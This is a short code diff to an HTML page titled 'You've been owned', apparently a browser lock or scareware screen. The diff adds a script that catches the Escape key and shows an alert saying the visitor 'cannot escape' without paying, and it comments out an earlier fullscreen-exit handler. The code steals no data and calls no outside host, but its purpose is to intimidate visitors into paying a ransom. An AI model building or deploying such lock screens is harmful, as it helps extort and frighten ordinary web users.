@@ -5,6 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>You've been owned</title>
     <script>
+      
+      document.addEventListener("keydown",function(e){
+          var charCode = e.charCode || e.keyCode || e.which;
+          if (charCode == 27){
+              alert("You cannot escape if you don't pay first.");
+              return false;
+          }
+      });
+      
+      /*
      document.addEventListener("fullscreenchange", function() {
        console.log(event);
         if(!document.fullscreenElement){
@@ -29,6 +39,7 @@
             return false;
           }
       });
+      */
     </script>
   </head>
   <style>
